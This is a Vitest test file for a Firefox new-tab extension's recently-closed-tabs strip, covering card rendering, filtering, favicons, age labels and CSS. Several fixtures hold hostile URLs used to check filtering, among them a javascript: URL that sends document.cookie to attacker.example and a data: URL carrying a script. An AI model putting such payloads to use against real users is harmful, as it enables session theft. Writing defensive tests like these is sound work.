/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this file,
 * You can obtain one at http://mozilla.org/MPL/2.0/. */

/**
 * Integration test: recently-closed-tabs card strip + one-click restore.
 *
 * Extracts `refreshRecent`, `trimRecent`, `isValidURL`, and `_formatAge`
 * from the real `newTab.js` via `vm.runInThisContext` and exercises the
 * recently-closed tabs logic with mocked `chrome.sessions` and DOM.
 */

import { describe, it, expect, vi, beforeAll, beforeEach } from 'vitest';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import vm from 'node:vm';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const NEWTAB_PATH = path.resolve(__dirname, '../../webextension/newTab.js');

function extractMethod(source: string, methodName: string): string {
	const sigPattern = new RegExp(`^\\t(?:async\\s+)?(?:get\\s+)?${methodName}[\\(\\s]`, 'm');
	const match = source.match(sigPattern);
	if (!match || match.index === undefined) {throw new Error(`${methodName} not found`);}
	let depth = 0;
	const start = match.index;
	let i = source.indexOf('{', start);
	for (; i < source.length; i++) {
		if (source[i] === '{') {depth++;}
		else if (source[i] === '}') { depth--; if (depth === 0) {return source.substring(start, i + 1);} }
	}
	throw new Error('Unbalanced braces');
}

function makeMockElement(): any {
	const children: any[] = [];
	return {
		href: '',
		className: '',
		title: '',
		style: {},
		dataset: {},
		onclick: null,
		appendChild: vi.fn((child: any) => { children.push(child); return child; }),
		_children: children,
	};
}

describe('Recently-closed tabs — newTab.js', () => {
	let harness: any;
	let recentList: any;
	let strip: any;
	let appendedCards: any[];

	beforeAll(() => {
		// eslint-disable-next-line ntt/no-source-grep -- loading module for behavioral test
		const source = fs.readFileSync(NEWTAB_PATH, 'utf8');
		const refreshRecent = extractMethod(source, 'refreshRecent');
		const trimRecent = extractMethod(source, 'trimRecent');
		const isValidURL = extractMethod(source, 'isValidURL');
		const _formatAge = extractMethod(source, '_formatAge');

		globalThis.Prefs = { recent: true };
		(globalThis as any).HTML_NAMESPACE = 'http://www.w3.org/1999/xhtml';

		chrome.sessions = {
			getRecentlyClosed: vi.fn(),
			restore: vi.fn(),
			onChanged: { addListener: vi.fn() },
		} as any;

		// `_layoutTitlebar` is the source of the card cap; stub it so these
		// behavioural tests control how many cards refreshRecent may render
		// (default 10, matching the old hard cap). The real slot-sizing math
		// is covered by titlebar-slots.test.ts.
		const code = `var newTabTools = { ${refreshRecent}, ${trimRecent}, ${isValidURL}, ${_formatAge}, recentList: null, _layoutResult: { cardCount: 10, slotWidth: 186, searchWidth: 186 }, _layoutTitlebar() { return this._layoutResult; } };`;
		vm.runInThisContext(code, { filename: 'recent-tabs-harness.js' });
		harness = (globalThis as any).newTabTools;
	});

	beforeEach(() => {
		vi.clearAllMocks();
		Prefs.recent = true;
		appendedCards = [];

		// The recently-closed cards now render directly into the titlebar
		// container (#ntt-titlebar-recent), so the strip *is* recentList.
		recentList = {
			hidden: false,
			querySelectorAll: vi.fn(() => []),
			removeChild: vi.fn(),
			appendChild: vi.fn((el: any) => { appendedCards.push(el); return el; }),
		};
		strip = recentList;
		harness.recentList = recentList;
		harness._layoutResult = { cardCount: 10, slotWidth: 186, searchWidth: 186 };

		document.createElementNS = vi.fn(() => makeMockElement()) as any;

		document.createElement = vi.fn(() => ({
			classList: { add: vi.fn() },
			onerror: null,
			src: '',
			remove: vi.fn(),
		})) as any;

		document.createTextNode = vi.fn((text: string) => ({ textContent: text })) as any;
	});

	// ==================== Prefs.recent guard ====================

	it('hides recent list when Prefs.recent is false', () => {
		Prefs.recent = false;
		harness.refreshRecent();
		// The container is no longer display:none'd — it stays laid out as the
		// empty greedy spacer that pins the masthead to the right edge; it just
		// holds no cards when recent is off.
		expect(recentList.hidden).toBe(false);
		expect(chrome.sessions.getRecentlyClosed).not.toHaveBeenCalled();
	});

	it('calls chrome.sessions.getRecentlyClosed when Prefs.recent is true', () => {
		harness.refreshRecent();
		expect(chrome.sessions.getRecentlyClosed).toHaveBeenCalledWith(expect.any(Function));
	});

	// ==================== clearing existing items ====================

	it('removes existing cards before rebuilding', () => {
		const existingCard = { className: 'ntt-recent-card' };
		strip.querySelectorAll.mockReturnValue([existingCard]);
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb([]));
		harness.refreshRecent();
		expect(strip.removeChild).toHaveBeenCalledWith(existingCard);
	});

	// ==================== creating items ====================

	it('creates card elements with ntt-recent-card class', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Example', sessionId: 's1', favIconUrl: null, incognito: false, lastModified: Math.floor(Date.now() / 1000) - 120 } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(strip.appendChild).toHaveBeenCalledTimes(1);
		const card = appendedCards[0];
		expect(card.className).toBe('ntt-recent-card');
		expect(card.dataset.sessionId).toBe('s1');
	});

	it('card is an anchor with href set to the tab URL', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Example', sessionId: 's1', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards[0].href).toBe('https://example.com');
	});

	it('card has favicon, text, and age children', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Example', sessionId: 's1', favIconUrl: null, incognito: false, lastModified: Math.floor(Date.now() / 1000) - 120 } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const card = appendedCards[0];
		expect(card.appendChild).toHaveBeenCalledTimes(3);
		const [fav, text, age] = card._children;
		expect(fav.className).toBe('ntt-recent-favicon');
		expect(text.className).toBe('ntt-recent-text');
		expect(age.className).toBe('ntt-recent-age');
	});

	it('text span contains name and domain sub-spans', () => {
		const items = [
			{ tab: { url: 'https://example.com/page', title: 'My Page', sessionId: 's1', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const text = appendedCards[0]._children[1];
		expect(text.appendChild).toHaveBeenCalledTimes(2);
		const [nameEl, urlEl] = text._children;
		expect(nameEl.className).toBe('ntt-recent-name');
		expect(urlEl.className).toBe('ntt-recent-url');
	});

	it('name span shows title, domain span shows hostname', () => {
		const items = [
			{ tab: { url: 'https://example.com/page', title: 'My Page', sessionId: 's1', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const text = appendedCards[0]._children[1];
		const [nameEl, urlEl] = text._children;
		const nameText = nameEl._children[0];
		const urlText = urlEl._children[0];
		expect(nameText.textContent).toBe('My Page');
		expect(urlText.textContent).toBe('example.com');
	});

	it('domain span shows the registrable domain — strips a leading www. (§4)', () => {
		const items = [
			{ tab: { url: 'https://www.theverge.com/tech', title: 'The Verge', sessionId: 's1', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const urlEl = appendedCards[0]._children[1]._children[1];
		expect(urlEl._children[0].textContent).toBe('theverge.com');
	});

	it('sets tooltip with title and URL when both differ', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Example', sessionId: 's1', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards[0].title).toBe('Example\nhttps://example.com');
	});

	it('sets tooltip to just URL when title equals URL', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'https://example.com', sessionId: 's1', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards[0].title).toBe('https://example.com');
	});

	it('sets tooltip to empty when title is empty', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: '', sessionId: 's1', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards[0].title).toBe('');
	});

	// ==================== skipping items ====================

	it('skips incognito tabs', () => {
		const items = [
			{ tab: { url: 'https://private.com', title: 'Private', sessionId: 's1', favIconUrl: null, incognito: true } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(strip.appendChild).not.toHaveBeenCalled();
	});

	it('skips items without a tab property (window sessions)', () => {
		const items = [
			{ window: { sessionId: 'w1' } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(strip.appendChild).not.toHaveBeenCalled();
	});

	it('skips tabs with moz-extension:// URLs (filters out own new-tab page)', () => {
		const items = [
			{ tab: { url: 'moz-extension://abc-123/newTab.html', title: 'New Tab', sessionId: 's1', favIconUrl: null, incognito: false } },
			{ tab: { url: 'https://example.com', title: 'Example', sessionId: 's2', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards).toHaveLength(1);
		expect(appendedCards[0].href).toBe('https://example.com');
	});

	it('skips tabs with a javascript: URL (§1.3 — card.href must never be javascript:)', () => {
		// Middle-click/Ctrl+click bypass the onclick handler and navigate the
		// href directly, so a javascript: session URL must be filtered out.
		const items = [
			{ tab: { url: 'javascript:fetch("http://attacker.example/"+document.cookie)', title: 'Evil', sessionId: 's1', favIconUrl: null, incognito: false } },
			{ tab: { url: 'https://example.com', title: 'Example', sessionId: 's2', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards).toHaveLength(1);
		expect(appendedCards[0].href).toBe('https://example.com');
	});

	it('skips tabs with a data: URL (§1.3)', () => {
		const items = [
			{ tab: { url: 'data:text/html,<script>alert(1)</script>', title: 'Data', sessionId: 's1', favIconUrl: null, incognito: false } },
			{ tab: { url: 'https://example.com', title: 'Example', sessionId: 's2', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards).toHaveLength(1);
		expect(appendedCards[0].href).toBe('https://example.com');
	});

	it('keeps http/https/ftp recently-closed tabs (§1.3 — valid protocols pass)', () => {
		const items = [
			{ tab: { url: 'https://secure.example/', title: 'S', sessionId: 's1', favIconUrl: null, incognito: false } },
			{ tab: { url: 'http://plain.example/', title: 'P', sessionId: 's2', favIconUrl: null, incognito: false } },
			{ tab: { url: 'ftp://files.example/', title: 'F', sessionId: 's3', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards).toHaveLength(3);
	});

	// ==================== favicon ====================

	it('adds favicon img inside favicon span when favIconUrl is valid', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 's1', favIconUrl: 'https://example.com/favicon.ico', incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const card = appendedCards[0];
		const fav = card._children[0];
		expect(fav.className).toBe('ntt-recent-favicon');
		const img = fav._children[0];
		expect(img.src).toBe('https://example.com/favicon.ico');
	});

	it('shows letter glyph in favicon span when favIconUrl is falsy', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 's1', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const fav = appendedCards[0]._children[0];
		const glyph = fav._children[0];
		expect(glyph.textContent).toBe('E');
	});

	it('does not add favicon img when favIconUrl has invalid protocol', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 's1', favIconUrl: 'javascript:alert(1)', incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const fav = appendedCards[0]._children[0];
		expect(fav._children[0].textContent).toBe('E');
	});

	it('does not add favicon img when favIconUrl is a data: URI', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 's1', favIconUrl: 'data:image/png;base64,abc', incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const fav = appendedCards[0]._children[0];
		expect(fav._children[0].textContent).toBe('E');
	});

	it('favicon span gets a hue-based backgroundColor', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 's1', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const fav = appendedCards[0]._children[0];
		expect(fav.style.backgroundColor).toMatch(/^hsl\(\d+, 50%, 40%\)$/);
	});

	// ==================== visibility ====================

	it('hides recent list when no items added', () => {
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb([]));
		harness.refreshRecent();
		expect(recentList.hidden).toBe(true);
	});

	it('shows recent list when items added', () => {
		recentList.hidden = true;
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 's1', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(recentList.hidden).toBe(false);
	});

	// ==================== onclick restore ====================

	it('onclick handler calls chrome.sessions.restore with sessionId', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 'abc123', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const card = appendedCards[0];
		const result = card.onclick.call(card);
		expect(chrome.sessions.restore).toHaveBeenCalledWith('abc123');
		expect(result).toBe(false);
	});

	// ==================== multiple items ====================

	it('creates multiple cards for multiple valid tabs', () => {
		const items = [
			{ tab: { url: 'https://a.com', title: 'A', sessionId: 's1', favIconUrl: null, incognito: false } },
			{ tab: { url: 'https://b.com', title: 'B', sessionId: 's2', favIconUrl: null, incognito: false } },
			{ tab: { url: 'https://c.com', title: 'C', sessionId: 's3', favIconUrl: null, incognito: true } }, // skipped
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards).toHaveLength(2);
	});

	// ==================== text content fallback ====================

	it('uses URL as name text when title is empty', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: '', sessionId: 's1', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const text = appendedCards[0]._children[1];
		const nameEl = text._children[0];
		expect(nameEl._children[0].textContent).toBe('https://example.com');
	});

	// ==================== age formatting ====================

	it('omits age span when lastModified is falsy', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 's1', favIconUrl: null, incognito: false, lastModified: undefined } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const card = appendedCards[0];
		expect(card.appendChild).toHaveBeenCalledTimes(2);
	});

	it('shows age in seconds for very recent tabs', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 's1', favIconUrl: null, incognito: false, lastModified: Math.floor(Date.now() / 1000) - 30 } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const age = appendedCards[0]._children[2];
		expect(age._children[0].textContent).toMatch(/^\d+s$/);
	});

	it('shows age in minutes', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 's1', favIconUrl: null, incognito: false, lastModified: Math.floor(Date.now() / 1000) - 300 } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const age = appendedCards[0]._children[2];
		expect(age._children[0].textContent).toBe('5m');
	});

	it('shows age in hours', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 's1', favIconUrl: null, incognito: false, lastModified: Math.floor(Date.now() / 1000) - 7200 } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const age = appendedCards[0]._children[2];
		expect(age._children[0].textContent).toBe('2h');
	});

	it('shows age in days', () => {
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 's1', favIconUrl: null, incognito: false, lastModified: Math.floor(Date.now() / 1000) - 172800 } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		const age = appendedCards[0]._children[2];
		expect(age._children[0].textContent).toBe('2d');
	});

	// ==================== card cap from _layoutTitlebar ====================

	it('renders at most _layoutTitlebar().cardCount cards', () => {
		harness._layoutResult = { cardCount: 10, slotWidth: 186, searchWidth: 186 };
		const items = Array.from({ length: 15 }, (_, i) => ({
			tab: { url: `https://site${i}.com`, title: `Site ${i}`, sessionId: `s${i}`, favIconUrl: null, incognito: false },
		}));
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards).toHaveLength(10);
	});

	it('shrinks the card count to the titlebar cap on a narrower window', () => {
		harness._layoutResult = { cardCount: 3, slotWidth: 150, searchWidth: 150 };
		const items = Array.from({ length: 15 }, (_, i) => ({
			tab: { url: `https://site${i}.com`, title: `Site ${i}`, sessionId: `s${i}`, favIconUrl: null, incognito: false },
		}));
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards).toHaveLength(3);
	});

	it('renders no cards and stays hidden when the cap is 0 (narrow window)', () => {
		harness._layoutResult = { cardCount: 0, slotWidth: 140, searchWidth: 400 };
		const items = [
			{ tab: { url: 'https://example.com', title: 'Ex', sessionId: 's1', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards).toHaveLength(0);
		// Container stays laid out as the empty greedy spacer (pins masthead right).
		expect(recentList.hidden).toBe(false);
		// Cap 0 short-circuits before querying sessions.
		expect(chrome.sessions.getRecentlyClosed).not.toHaveBeenCalled();
	});

	// ==================== skip URLs already in tiles ====================

	it('skips tabs whose URL matches a visible tile', () => {
		(globalThis as any).Grid = {
			sites: [
				{ url: 'https://already-pinned.com' },
				null,
				{ url: 'https://another-tile.com' },
			],
		};
		const items = [
			{ tab: { url: 'https://already-pinned.com', title: 'Pinned', sessionId: 's1', favIconUrl: null, incognito: false } },
			{ tab: { url: 'https://unique.com', title: 'Unique', sessionId: 's2', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards).toHaveLength(1);
		expect(appendedCards[0].href).toBe('https://unique.com');
		delete (globalThis as any).Grid;
	});

	// ==================== deduplication ====================

	it('deduplicates tabs with same title and same hostname', () => {
		const items = [
			{ tab: { url: 'https://example.com/page1', title: 'News', sessionId: 's1', favIconUrl: null, incognito: false } },
			{ tab: { url: 'https://example.com/page2', title: 'News', sessionId: 's2', favIconUrl: null, incognito: false } },
			{ tab: { url: 'https://other.com/page', title: 'News', sessionId: 's3', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards).toHaveLength(2);
		expect(appendedCards[0].href).toBe('https://example.com/page1');
		expect(appendedCards[1].href).toBe('https://other.com/page');
	});

	it('allows tabs with same hostname but different titles', () => {
		const items = [
			{ tab: { url: 'https://example.com/page1', title: 'Article A', sessionId: 's1', favIconUrl: null, incognito: false } },
			{ tab: { url: 'https://example.com/page2', title: 'Article B', sessionId: 's2', favIconUrl: null, incognito: false } },
		];
		(chrome.sessions.getRecentlyClosed as any).mockImplementation((cb: any) => cb(items));
		harness.refreshRecent();
		expect(appendedCards).toHaveLength(2);
	});
});

describe('Recently-closed cards — CSS (newTab.css)', () => {
	let css: string;

	beforeAll(() => {
		const CSS_PATH = path.resolve(__dirname, '../../webextension/newTab.css');
		// eslint-disable-next-line ntt/no-source-grep -- wiring check: CSS rules
		css = fs.readFileSync(CSS_PATH, 'utf8');
	});

	it('.ntt-recent-card has surface background and border-radius', () => {
		const cardRule = css.match(/\.ntt-recent-card\s*\{[^}]*\}/s);
		expect(cardRule).toBeTruthy();
		expect(cardRule![0]).toMatch(/background:\s*var\(--ntt-surface/);
		expect(cardRule![0]).toMatch(/border-radius:\s*7px/);
	});

	it('.ntt-recent-card width tracks the JS-computed slot variable', () => {
		const cardRule = css.match(/\.ntt-recent-card\s*\{[^}]*\}/s);
		expect(cardRule).toBeTruthy();
		expect(cardRule![0]).toMatch(/display:\s*flex/);
		expect(cardRule![0]).toMatch(/width:\s*var\(--ntt-slot-w/);
	});

	it('#ntt-titlebar-recent is a horizontal flex container with grid-spacing gap', () => {
		const stripRule = css.match(/#ntt-titlebar-recent\s*\{[^}]*\}/s);
		expect(stripRule).toBeTruthy();
		expect(stripRule![0]).toMatch(/display:\s*flex/);
		expect(stripRule![0]).toMatch(/gap:\s*var\(--ntt-gap/);
		expect(stripRule![0]).toMatch(/overflow:\s*hidden/);
	});

	it('.ntt-recent-name truncates with ellipsis', () => {
		const nameRule = css.match(/\.ntt-recent-name\s*\{[^}]*\}/s);
		expect(nameRule).toBeTruthy();
		expect(nameRule![0]).toMatch(/text-overflow:\s*ellipsis/);
		expect(nameRule![0]).toMatch(/overflow:\s*hidden/);
	});
});
